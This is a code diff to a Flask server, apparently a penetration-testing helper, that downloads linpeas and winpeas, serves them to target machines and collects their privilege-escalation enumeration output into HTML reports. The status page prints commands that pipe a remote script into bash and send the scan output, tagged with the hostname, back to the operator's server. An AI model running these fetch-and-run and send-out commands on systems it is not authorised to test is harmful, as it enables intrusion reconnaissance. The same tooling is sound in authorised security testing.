@@ -7,7 +7,8 @@ Receives linpeas/winpeas output and generates interactive HTML reports
 import os
 import hashlib
 import time
-from flask import Flask, request, jsonify, send_from_directory, render_template_string
+import requests
+from flask import Flask, request, jsonify, send_from_directory, send_file, render_template_string
 from datetime import datetime
 import json
 
@@ -16,33 +17,96 @@ app = Flask(__name__)
 # Configuration
 OUTPUT_DIR = "./received_outputs"
 REPORTS_DIR = "./reports"
+SCRIPTS_DIR = "./scripts"
 MAX_UPLOAD_SIZE = 500 * 1024 * 1024  # 500MB
 
 # Create directories
 os.makedirs(OUTPUT_DIR, exist_ok=True)
 os.makedirs(REPORTS_DIR, exist_ok=True)
+os.makedirs(SCRIPTS_DIR, exist_ok=True)
 
 # Active sessions tracking
 active_sessions = {}
+
+# PEASS script URLs
+LINPEAS_URL = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
+WINPEAS_URL = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe"
+
+
+def download_peass_scripts():
+    """Download linpeas and winpeas scripts on startup if not present"""
+    linpeas_path = os.path.join(SCRIPTS_DIR, "linpeas.sh")
+    winpeas_path = os.path.join(SCRIPTS_DIR, "winpeas.exe")
+    
+    print("[*] Checking for PEASS scripts...")
+    
+    # Download linpeas if not present
+    if not os.path.exists(linpeas_path):
+        print("[*] Downloading linpeas.sh...")
+        try:
+            response = requests.get(LINPEAS_URL, timeout=30)
+            with open(linpeas_path, 'wb') as f:
+                f.write(response.content)
+            os.chmod(linpeas_path, 0o755)
+            print(f"[+] Downloaded linpeas.sh ({len(response.content) / 1024:.2f} KB)")
+        except Exception as e:
+            print(f"[!] Failed to download linpeas: {e}")
+    else:
+        print("[+] linpeas.sh already present")
+    
+    # Download winpeas if not present
+    if not os.path.exists(winpeas_path):
+        print("[*] Downloading winpeas.exe...")
+        try:
+            response = requests.get(WINPEAS_URL, timeout=30)
+            with open(winpeas_path, 'wb') as f:
+                f.write(response.content)
+            print(f"[+] Downloaded winpeas.exe ({len(response.content) / 1024:.2f} KB)")
+        except Exception as e:
+            print(f"[!] Failed to download winpeas: {e}")
+    else:
+        print("[+] winpeas.exe already present")
+    
+    print("")
 
 
 @app.route('/')
 def index():
     """Status page showing active sessions and reports"""
     reports = [f for f in os.listdir(REPORTS_DIR) if f.endswith('.html')]
+    linpeas_exists = os.path.exists(os.path.join(SCRIPTS_DIR, "linpeas.sh"))
+    winpeas_exists = os.path.exists(os.path.join(SCRIPTS_DIR, "winpeas.exe"))
+    
     return f"""
     <html>
     <head><title>ParsingPeas - Active</title></head>
     <body style="font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px;">
         <h1>🟢 ParsingPeas Receiver Active</h1>
         <p>Server is running and ready to receive linpeas/winpeas output</p>
+        
+        <h2>Scripts Available:</h2>
+        <ul>
+            <li>linpeas.sh: {'✅' if linpeas_exists else '❌ Run setup.sh first'}</li>
+            <li>winpeas.exe: {'✅' if winpeas_exists else '❌ Run setup.sh first'}</li>
+        </ul>
+        
         <h2>Active Sessions: {len(active_sessions)}</h2>
         <h2>Generated Reports: {len(reports)}</h2>
         <ul>
         {''.join([f'<li><a href="/reports/{r}" style="color: #00ff00;">{r}</a></li>' for r in reports])}
         </ul>
+        
         <hr>
-        <p>To use: <code>curl -sSL http://{request.host}/get-script | bash</code></p>
+        <h3>Usage:</h3>
+        <p><strong>Linux targets:</strong></p>
+        <code style="background: #000; padding: 10px; display: block; margin: 10px 0;">
+curl -sSL http://{request.host}/get-script | bash
+        </code>
+        
+        <p><strong>Or manual:</strong></p>
+        <code style="background: #000; padding: 10px; display: block; margin: 10px 0;">
+curl http://{request.host}/get-linpeas | bash | curl -X POST --data-binary @- -H "X-Hostname: $(hostname)" http://{request.host}/upload
+        </code>
     </body>
     </html>
     """
@@ -56,6 +120,24 @@ def get_script():
     # Replace placeholder with actual server URL
     script = script.replace('KALI_SERVER_URL', f'http://{request.host}')
     return script, 200, {'Content-Type': 'text/plain'}
+
+
+@app.route('/get-linpeas')
+def get_linpeas():
+    """Serve linpeas.sh to target machine"""
+    linpeas_path = os.path.join(SCRIPTS_DIR, "linpeas.sh")
+    if not os.path.exists(linpeas_path):
+        return "Error: linpeas.sh not found. Run setup.sh first.", 404
+    return send_file(linpeas_path, mimetype='text/plain')
+
+
+@app.route('/get-winpeas')
+def get_winpeas():
+    """Serve winpeas.exe to target machine"""
+    winpeas_path = os.path.join(SCRIPTS_DIR, "winpeas.exe")
+    if not os.path.exists(winpeas_path):
+        return "Error: winpeas.exe not found. Run setup.sh first.", 404
+    return send_file(winpeas_path, mimetype='application/octet-stream')
 
 
 @app.route('/upload', methods=['POST'])
@@ -96,8 +178,10 @@ def upload():
         from parser import generate_html_report
         report_path = generate_html_report(filepath, hostname, scan_type)
         
+        report_url = f"http://{request.host}/reports/{os.path.basename(report_path)}"
         print(f"[+] Report generated: {report_path}")
-        print(f"[+] View at: http://{request.host}/reports/{os.path.basename(report_path)}")
+        print(f"[+] View at: {report_url}")
+        print(f"[+] " + "="*50)
         
         return jsonify({
             'status': 'success',
@@ -134,7 +218,14 @@ if __name__ == '__main__':
     """)
     print(f"[+] Output directory: {OUTPUT_DIR}")
     print(f"[+] Reports directory: {REPORTS_DIR}")
+    print(f"[+] Scripts directory: {SCRIPTS_DIR}")
+    print("")
+    
+    # Download PEASS scripts if needed
+    download_peass_scripts()
+    
     print(f"[+] Starting server...\n")
+    print(f"[+] Target usage: curl -sSL http://YOUR_IP:8000/get-script | bash\n")
     
     # Run on all interfaces, port 8000
     app.run(host='0.0.0.0', port=8000, debug=False, threaded=True)
